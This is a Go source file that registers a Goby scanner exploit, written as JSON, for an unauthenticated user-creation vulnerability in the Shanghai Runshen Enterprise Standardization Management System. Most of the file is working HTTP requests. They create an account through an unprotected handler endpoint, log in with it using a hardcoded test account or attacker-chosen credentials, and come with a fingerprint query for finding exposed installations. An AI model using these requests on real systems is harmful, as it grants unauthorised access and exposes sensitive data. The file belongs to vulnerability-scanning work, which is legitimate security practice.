package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Shanghai Runshen Information Enterprise Standardization Management System add users Vulnerability",
    "Description": "<p>Shanghai Runshen Information Enterprise Standardization Management System is a management system developed by Runshen Standardization Technical Service (Shanghai) Co., Ltd.</p><p>The standardization management system of Shanghai Runshen Information Enterprise has user addition loopholes. Attackers implement user addition through specific interfaces and log in to the system to obtain sensitive information. Shanghai Co., Ltd</p>",
    "Product": "Enterprise-Standardization-MS",
    "Homepage": "https://www.bzton.com/",
    "DisclosureDate": "2023-02-18",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"PDCA/js/_publicCom.js\"",
    "GobyQuery": "body=\"PDCA/js/_publicCom.js\"",
    "Level": "3",
    "Impact": "<p>The standardization management system of Shanghai Runshen Information Enterprise has user addition loopholes. Attackers implement user addition through specific interfaces and log in to the system to obtain sensitive information. Shanghai Co., Ltd</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.bzton.com/\">https://www.bzton.com/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "username",
            "type": "input",
            "value": "",
            "show": ""
        },
        {
            "name": "password",
            "type": "input",
            "value": "",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/PDCA/ashx/AddNewsHandler.ashx?action=Adduser",
                "follow_redirect": false,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "loginPageURL=",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=test666&pwd=test666&savedays=7"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/ashx/loginhandler.ashx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "username=test666&password=test666&savedays=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"message\":\"ok\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/PDCA/ashx/AddNewsHandler.ashx?action=Adduser",
                "follow_redirect": false,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "loginPageURL=",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username={{{username}}}&pwd={{{password}}}&savedays=7"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/ashx/loginhandler.ashx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "username={{{username}}}&password={{{password}}}&savedays=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"success\":true,\"message\":\"ok\"}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|variable|User created successfully"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "上海润申信息企业标准化管理系统用户添加漏洞",
            "Product": "企业标准化管理系统",
            "Description": "<p>上海润申信息企业标准化管理系统是一套由润申标准化技术服务（上海）有限公司开发的管理系统。</p><p>上海润申信息企业标准化管理系统存在用户添加漏洞，攻击者通过特定接口实现用户添加，登录系统获得敏感信息。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.bzton.com/\">https://www.bzton.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>上海润申信息企业标准化管理系统存在用户添加漏洞，攻击者通过特定接口实现用户添加，登录系统获得敏感信息。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Shanghai Runshen Information Enterprise Standardization Management System add users Vulnerability",
            "Product": "Enterprise-Standardization-MS",
            "Description": "<p>Shanghai Runshen Information Enterprise Standardization Management System is a management system developed by Runshen Standardization Technical Service (Shanghai) Co., Ltd.</p><p>The standardization management system of Shanghai Runshen Information Enterprise has user addition loopholes. Attackers implement user addition through specific interfaces and log in to the system to obtain sensitive information. Shanghai Co., Ltd</p>",
            "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.bzton.com/\">https://www.bzton.com/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>The standardization management system of Shanghai Runshen Information Enterprise has user addition loopholes. Attackers implement user addition through specific interfaces and log in to the system to obtain sensitive information. Shanghai Co., Ltd<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
